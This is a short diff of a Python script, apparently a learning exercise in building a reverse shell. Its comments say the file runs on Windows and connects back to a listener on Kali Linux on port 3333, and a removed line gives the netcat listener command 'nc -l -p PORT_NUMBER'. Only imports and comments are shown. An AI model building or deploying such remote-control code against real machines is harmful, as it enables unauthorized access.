@@ -1,11 +1,11 @@
 import socket
 import subprocess
 
-# target machine is kali linux and for controlling 
-# type 'nc -l -p PORT_NUMBER' on terminal on kali linux 
-# PORT_NUMBER is that we used 3333
+# python3 My-Socket-For-Windows.py
+# this file will run on windows after My-Socket-Listener.py run on kali linux
+# PORT_NUMBER is that we used 3333 for kali linux 
 
-# socket.socket(1,2)
+# socket.socket( {1} , {2} )
 # 1. hangi ag ailesi ile calisilacak.
 # 2. hangi yol ile veriler transfer edilecek.
 class MySocket:
